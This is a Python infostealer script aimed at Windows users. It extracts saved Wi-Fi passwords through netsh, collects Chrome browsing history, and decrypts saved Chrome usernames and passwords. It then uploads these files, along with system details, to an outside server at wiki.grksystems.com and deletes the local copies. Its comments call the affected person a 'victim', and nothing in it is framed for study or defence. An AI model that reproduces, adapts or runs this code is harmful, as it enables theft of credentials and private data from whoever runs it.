#!/usr/bin/python
import smtplib
import base64, os, sys, re
import sqlite3
import socket
import platform
import uuid
import requests
import base64
import socket
import sys
import platform
import os


# Dont change this
marker = "AUNIQUEMARKER"

def system_info():
    info = {
        "Name": socket.gethostname(),
        "FQDN": socket.getfqdn(),
        "System Platform": sys.platform,
        "Machine": platform.machine(),
        "Node": platform.node(),
        "Platform": platform.platform(),
        "Processor": platform.processor(),
        "System OS": platform.system(),
        "Release": platform.release(),
        "Version": platform.version()
    }
    return json.dumps(info)


def wifipass():
   def get_wlans():
      data = os.popen("netsh wlan show profiles").read()
      wifi = re.compile("All User Profile\s*:.(.*)")
      return wifi.findall(data)

   def get_pass(network):
      try:
         wlan = os.popen("netsh wlan show profile "+str(network.replace(" ","*"))+" key=clear").read()
         pass_regex = re.compile("Key Content\s*:.(.*)")
         return pass_regex.search(wlan).group(1)
      except:
         return " "

   f = open("wifi.txt","w")
   for wlan in get_wlans():
       f.write("-----------\n"+" SSID : "+wlan + "\n Password : " + get_pass(wlan))
   f.close()

wifipass()

################ CHROME ################
################  CODE  ################
################  HERE  ################
def history():
   import operator
   from collections import OrderedDict
#import matplotlib.pyplot as plt

   def parse(url):
           try:
                   parsed_url_components = url.split('//')
                   sublevel_split = parsed_url_components[1].split('/', 1)
                   domain = sublevel_split[0].replace("www.", "")
                   return domain
           except IndexError:
                   print("URL format error!")

   def analyze(results):
      b=open("chrome1.txt","w")
      for site, count in sites_count_sorted.items():
         #print site, count
         b.write(site + "\n")
#path to user's history database (Chrome)
      b.close()
   data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default"
   files = os.listdir(data_path)
   history_db = os.path.join(data_path, 'history')
#querying the db
   c = sqlite3.connect(history_db)
   cursor = c.cursor()
   select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
   cursor.execute(select_statement)
   results = cursor.fetchall() 
   sites_count = {} 
   for url, count in results:
           url = parse(url)
           if url in sites_count:
                   sites_count[url] += 1
           else:
                   sites_count[url] = 1
   sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))
   analyze (sites_count_sorted)
################ CHROME ################
################  CODE  ################
################  HERE  ################
history()
def chrome():
   import os,sqlite3,win32crypt
   data=os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
   connection = sqlite3.connect(data)
   cursor = connection.cursor()
   cursor.execute('SELECT action_url, username_value, password_value FROM logins')
   final_data=cursor.fetchall()
   a=open("chrome.txt","w")
   a.write("Extracted chrome passwords :\n")
   for website_data in final_data:
       password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
       one="Website  : "+str(website_data[0])
       two="Username : "+str(website_data[1])
       three="Password : "+str(password)
       a.write(one+"\n"+two+"\n"+three)
       a.write("\n"+"====="*10+"\n")
   a.close()

chrome()

################  EMAIL ################
################  CODE  ################
################  HERE  ################
def upload_file(filename, url):
    with open(filename, "rb") as fo:
        file_content = fo.read()
        encoded_content = base64.b64encode(file_content).decode("utf-8")
        response = requests.post(url, files={"file": (filename, file_content)})
    os.remove(filename)  # Eliminar el archivo local después de enviarlo
 
# URL de destino
url = "http://wiki.grksystems.com/tmp/upload.php"
 
# Enviar wifi.txt
filename = "wifi.txt"
body = """
New stuff info from victim
"""
upload_file(filename, url)
 
# Enviar chrome1.txt
filename = "chrome1.txt"
body = """
New stuff info from victim - History
"""
upload_file(filename, url)
 
# Enviar chrome.txt con información adicional del sistema
filename = "chrome.txt"
body = """
New stuff info from victim
===========================
Name: %s
FQDN: %s
System Platform: %s
Machine: %s
Node: %s
Platform: %s
Processor: %s
System OS: %s
Release: %s
Version: %s
""" % (
    socket.gethostname(), 
    socket.getfqdn(), 
    sys.platform, 
    platform.machine(),
    platform.node(),
    platform.platform(),
    platform.processor(),
    platform.system(),
    platform.release(),
    platform.version()
)

open(filename,"w").write(body)
 
upload_file(filename, url)
